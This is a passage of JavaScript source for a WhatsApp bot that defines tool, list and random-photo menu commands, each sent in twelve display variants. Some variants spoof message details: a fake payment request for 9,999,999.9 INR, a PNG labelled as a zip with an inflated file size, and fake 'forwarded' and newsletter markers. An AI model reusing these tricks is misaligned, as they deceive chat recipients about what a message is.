  messageId: msg.key.id
})
}
}
break
case 'toolmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Tool Menu* 」❍
│${setv} ${prefix}obfuscate 🅕
│${setv} ${prefix}styletext 🅕
│${setv} ${prefix}fliptext 🅕
│${setv} ${prefix}tts 🅕
│${setv} ${prefix}say 🅕
│${setv} ${prefix}togif 🅕
│${setv} ${prefix}toqr 🅕
│${setv} ${prefix}bass 🅕
│${setv} ${prefix}blown 🅕
│${setv} ${prefix}deep 🅕
│${setv} ${prefix}earrape 🅕
│${setv} ${prefix}fast 🅕
│${setv} ${prefix}fat 🅕
│${setv} ${prefix}nightcore 🅕
│${setv} ${prefix}reverse 🅕
│${setv} ${prefix}robot 🅕
│${setv} ${prefix}slow 🅕
│${setv} ${prefix}smooth 🅕
│${setv} ${prefix}squirrel 🅕
│${setv} ${prefix}tinyurl 🅕
│${setv} ${prefix}tovn 🅕
│${setv} ${prefix}toptv 🅕
│${setv} ${prefix}toaudio 🅕
│${setv} ${prefix}tomp3 🅕
│${setv} ${prefix}tomp4🅕
│${setv} ${prefix}toimg 🅕
│${setv} ${prefix}toonce 🅕
│${setv} ${prefix}toptv 🅕
│${setv} ${prefix}sticker 🅕
│${setv} ${prefix}smeme 🅕
│${setv} ${prefix}smeta 🅕
│${setv} ${prefix}take 🅟
│${setv} ${prefix}emojimix 🅕
│${setv} ${prefix}volaudio 🅕
│${setv} ${prefix}volvideo 🅕
│${setv} ${prefix}ebinary 🅕
│${setv} ${prefix}dbinary 🅕
│${setv} ${prefix}ssweb 🅕
│${setv} ${prefix}quoted 🅕
│${setv} ${prefix}translate 🅕
│${setv} ${prefix}get 🅕
│${setv} ${prefix}tourl 🅕
│${setv} ${prefix}write 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'listmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *List Menu* 」❍
│${setv} ${prefix}listprem 🅕
│${setv} ${prefix}listowner 🅕
│${setv} ${prefix}liststicker 🅕
│${setv} ${prefix}listimage 🅕
│${setv} ${prefix}listvideo 🅕
│${setv} ${prefix}listvn 🅕
│${setv} ${prefix}listapk 🅕
│${setv} ${prefix}listzip 🅕
│${setv} ${prefix}listpdf 🅕
│${setv} ${prefix}listbadword 🅕
│${setv} ${prefix}listpc 🅕
│${setv} ${prefix}listgc 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomphotomenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Random Photo* 」❍
│${setv} ${prefix}aesthetic 🅕
│${setv} ${prefix}coffee 🅕
│${setv} ${prefix}wikimedia 🅕
│${setv} ${prefix}wallpaper 🅕
│${setv} ${prefix}art 🅕
│${setv} ${prefix}bts 🅕
│${setv} ${prefix}dogwoof 🅕
│${setv} ${prefix}catmeow 🅕
│${setv} ${prefix}lizardpic 🅕
│${setv} ${prefix}goosebird 🅕
│${setv} ${prefix}8ballpool 🅕
│${setv} ${prefix}cosplay 🅕
│${setv} ${prefix}hacker 🅕
│${setv} ${prefix}cyber 🅕
│${setv} ${prefix}gamewallpaper 🅕
│${setv} ${prefix}islamic 🅕
│${setv} ${prefix}jennie 🅕
│${setv} ${prefix}jiso 🅕
│${setv} ${prefix}satanic 🅕
│${setv} ${prefix}justina 🅕
│${setv} ${prefix}cartoon 🅕
│${setv} ${prefix}pentol 🅕
│${setv} ${prefix}cat 🅕
│${setv} ${prefix}kpop 🅕
│${setv} ${prefix}exo 🅕
│${setv} ${prefix}lisa 🅕
│${setv} ${prefix}space 🅕
│${setv} ${prefix}car 🅕
│${setv} ${prefix}technology 🅕
│${setv} ${prefix}bike 🅕
│${setv} ${prefix}shortquote 🅕
│${setv} ${prefix}antiwork 🅕
│${setv} ${prefix}hacking 🅕
│${setv} ${prefix}boneka 🅕
│${setv} ${prefix}rose 🅕
│${setv} ${prefix}ryujin 🅕
│${setv} ${prefix}ulzzangboy 🅕
│${setv} ${prefix}ulzzanggirl 🅕
│${setv} ${prefix}wallml 🅕
│${setv} ${prefix}wallphone 🅕
│${setv} ${prefix}mountain 🅕
│${setv} ${prefix}goose 🅕
│${setv} ${prefix}profilepic 🅕
│${setv} ${prefix}couplepp 🅕
│${setv} ${prefix}programming 🅕
│${setv} ${prefix}pubg 🅕
│${setv} ${prefix}blackpink 🅕
│${setv} ${prefix}randomboy 🅕  
│${setv} ${prefix}randomgirl 🅕
│${setv} ${prefix}hijab 🅕  
│${setv} ${prefix}chinese 🅕
│${setv} ${prefix}indo 🅕
│${setv} ${prefix}japanese 🅕
│${setv} ${prefix}korean 🅕
│${setv} ${prefix}malay 🅕
│${setv} ${prefix}thai 🅕
│${setv} ${prefix}vietnamese 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
